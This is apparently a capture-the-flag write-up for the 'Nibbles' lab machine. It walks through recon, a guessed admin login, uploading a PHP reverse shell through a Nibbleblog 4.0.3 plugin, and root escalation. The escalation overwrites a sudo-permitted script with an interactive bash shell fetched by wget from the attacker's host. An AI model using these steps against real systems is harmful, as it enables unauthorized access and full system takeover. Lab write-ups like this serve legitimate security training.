# recon
- 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

found a hidden text in index.html, which lead us to `nibbles.htb/nibbleblog/`

now gobuster!!!
```
/README
/admin (Status: 301)
/content (Status: 301)
/languages (Status: 301)
/plugins (Status: 301)
/themes (Status: 301)
```

- /nibbleblog/README
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```
- /nibbleblog/admin.php is a login page. guess and luckly got in with `admin:nibbles`

some digging and found this link from [wikihack](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/)

okey let find our shell on kali
```console
kali@kali:/opt$ sudo find / -name php-reverse* 2> /dev/null
/usr/share/webshells/php/php-reverse-shell.php
```
copy it and modify ip and port
1. upload shell as the guide said
2. nc listen for incoming reverse shell
3. vistie nibbles.htb/nibbleblog/content/private/plugins/my_image/my_image.php

BOOM ! go grab the flag

there is a zip file call personal.zip. I found a .sh call monitor.sh that looks interesting

```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
I googling a bit about **tecmint monitor** but didnt find anything juicy about the script


Escape jail shell by runing `python3 -c 'import pty; pty.spawn("/bin/bash")'`
now let check.. 

- sudo -l
```console
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
since I cant use `vi` or `nano` I decided to create the monitor.sh on my kali and run python webserver then wget it on the victim server. here is the content of `monitor.sh` 
```console
kali@kali:~/HTB/nibbles$ cat monitor.sh 
#!/bin/sh
/bin/bash -i
```
now remove the old .sh and wget the one we created on kali
```console
nibbler@Nibbles:/home/nibbler/personal/stuff$ rm monitor.sh #remove the old one that i uzip it
nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.14.8:8888/monitor.sh
<er/personal/stuff$ wget http://10.10.14.8:8888/monitor.sh                   
--2020-10-02 15:00:51--  http://10.10.14.8:8888/monitor.sh
Connecting to 10.10.14.8:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23 [text/x-sh]
Saving to: 'monitor.sh.1'

monitor.sh.1        100%[===================>]      23  --.-KB/s    in 0s      

2020-10-02 15:00:51 (2.39 MB/s) - 'monitor.sh.1' saved [23/23]
```
now let get root shell! 
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
ls -la
total 24
drwxr-xr-x 2 nibbler nibbler  4096 Oct  2 15:02 .
drwxr-xr-x 3 nibbler nibbler  4096 Dec 10  2017 ..
-rw-r--r-- 1 nibbler nibbler 12288 Oct  2 14:50 .monitor.sh.swp
-rwxrwxrwx 1 nibbler nibbler    23 Oct  2 14:56 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cd ..
nibbler@Nibbles:/home/nibbler/personal$ sudo stuff/monitor.sh
sudo stuff/monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
```
Now go grab root flag

ps: I keep getting this message `sudo: unable to resolve host Nibbles: Connection timed out` 1st time when i run `sudo -l` now again after googling around I found a solution which is add host name to /etc/hosts: `echo "127.0.1.2 Nibbles" >> /etc/hosts`
